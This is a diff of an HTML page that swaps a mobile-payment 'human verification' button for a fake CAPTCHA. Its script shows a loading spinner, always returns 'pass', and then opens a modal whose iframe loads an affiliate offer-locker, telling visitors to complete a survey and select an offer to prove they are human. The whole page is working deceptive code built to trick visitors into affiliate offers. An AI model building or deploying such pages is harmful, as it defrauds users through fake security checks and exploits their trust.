@@ -1,14 +1,170 @@
 <html>
-<body>
 <style>
-h1,p{
-font-family: Ubuntu;
+
+*{
+
+  font-family: "Questrial";
 }
+
+#fake-captcha {
+  position: absolute;
+  top: 50%;
+  left: 50%;
+  transform: translate(-50%, -50%);
+  text-align: center;
+  font-family: "Questrial";
+  font-size: 4vw;
+  line-height: 4.25vw;
+  white-space: nowrap;
+  cursor: pointer;
+  color: #444;
+}
+
+#fake-captcha:hover {
+  color: #666;
+}
+
+#fake-checkbox {
+  position: relative;
+  float: left;
+  margin-right: 1vw;
+  width: 4vw;
+  height: 4vw;
+  border: 2px solid #ccc;
+  border-radius: 5px;
+  transition: all 0.2s;
+  box-sizing: border-box;
+}
+
+#fake-checkbox:hover {
+  border-color: #aaa;
+  background: #eee;
+}
+
+#fake-captcha.loading {
+  cursor: default;
+  color: #444;
+}
+
+.loading #fake-checkbox {
+  border-radius: 50%;
+  background: transparent;
+  border-color: #888;
+  border-width: 12px;
+  border-style: inset;
+  animation: spin 1s infinite linear;
+}
+
+.pass #fake-checkbox {
+  background: #c1d9a3;
+  border-color: #669f56;
+}
+
+.pass #fake-checkbox:before {
+  position: absolute;
+  top: 0;
+  left: 0;
+  display: block;
+  content: "\2713";
+  font-size: 6vw;
+  color: #275f18;
+}
+
+@keyframes spin {
+  0% { transform: rotate(0deg); }
+  100% { transform: rotate(360deg); }
+}
+
+.fail {
+  animation: fail 0.1s 4;
+}
+
+@keyframes fail {
+  0% { transform: translate(-50%, -50%); }
+  25% { transform: translate(-51%, -50%); }
+  50% { transform: translate(-50%, -50%); }
+  75% { transform: translate(-49%, -50%); }
+  100% { transform: translate(-50%, -50%); }
+}
+
+/* The Modal (background) */
+.modal {
+    display: none; /* Hidden by default */
+    position: fixed; /* Stay in place */
+    z-index: 1; /* Sit on top */
+    padding-top: 10px; /* Location of the box */
+    left: 0;
+    top: 0;
+    width: 100%; /* Full width */
+    height: 100%; /* Full height */
+    overflow: auto; /* Enable scroll if needed */
+    background-color: rgb(0,0,0); /* Fallback color */
+    background-color: rgba(0,0,0,0.4); /* Black w/ opacity */
+}
+
+/* Modal Content */
+.modal-content {
+    background-color: #fefefe;
+    margin: auto;
+    padding: 20px;
+    border: 1px solid #888;
+    width: 80%;
+}
+
+/* The Close Button */
+.close {
+    color: #aaaaaa;
+    float: right;
+    font-size: 28px;
+    font-weight: bold;
+}
+
+.close:hover,
+.close:focus {
+    color: #000;
+    text-decoration: none;
+    cursor: pointer;
+}
+
 </style>
-<script src='https://assets.fortumo.com/fmp/fortumopay.js' type='text/javascript'></script>
-<center><h1>Mobile Human Verification</h1>
-  <p>Click the button <strong><u>below</u></strong> and <strong><u>follow</u></strong> the <b><u>instructions</b></u> to prove you're human.</p>
-<a id="fmp-button" href="#" rel="0b7cedc6ab944998fd1c720fd5deed58"><img src="https://www.a2hosting.com/blog/content/uploads/2017/02/image01-1.png" alt="Mobile Payments by Fortumo" style="box-shadow: 10px 10px 5px #888888;border: 2px solid black;"/></a>
-  </center>
-<body>
+
+<div id="fake-captcha">
+  <div id="fake-checkbox"></div>
+  Are you really a human?
+</div>
+
+<!-- The Modal -->
+<div id="myModal" class="modal">
+
+  <!-- Modal content -->
+  <div class="modal-content">
+    <span class="close">&times;</span>
+<center><h1 style="font-family:Ubuntu;">Mobile Human Verification</h1>
+  <p style="font-family:Ubuntu;font-size:20px;">Complete the survey <strong><u>below</u></strong> and <strong><u>select</u></strong> an offer to prove you're human.</p>
+<iframe src="https://t.grtyb.com/1flxsjx4lc?aff_id=58872&offer_id=3609&noredirect=true&c0=000000&c1=ffffff&c2=DB232C&c3=000000&c4=000000&c5=ffffff&c6=ffffff&c8=333333&c9=ffffff&c10=DB232C&c11=ffffff&c12=000000&c13=DB232C&c14=ffffff&custom1=789&custom3=58872&has-logo=1&logo_position=center&footer=0&bgImg=&aff_sub=&aff_sub2=&aff_sub3=&aff_sub4=&aff_sub5=&source=&displayComments=1&incentive_thumb=1&incentive_text=1&incentive_reward_thumb=1&z1=10833&z2=10834&z3=10835&z4=10836&set=21|&lc0=D71F27&lc1=ffffff&file_id=245612" width="100%" height="100%"></iframe>
+</center>
+  </div>
+</div>
+<script>
+var modal = document.getElementById('myModal');
+var captcha = document.getElementById("fake-captcha");
+
+var passOrFail = function() {
+  return "pass";
+}
+
+captcha.onclick = function() {
+  if (captcha.className.includes("loading")) return;
+  
+  captcha.className = "";
+  
+  captcha.className += "loading";
+  
+  setTimeout(function() {
+    captcha.className = captcha.className.replace("loading", "");
+    captcha.className += passOrFail();
+    modal.style.display = "block";
+  }, 2000);
+}
+</script>
 </html>
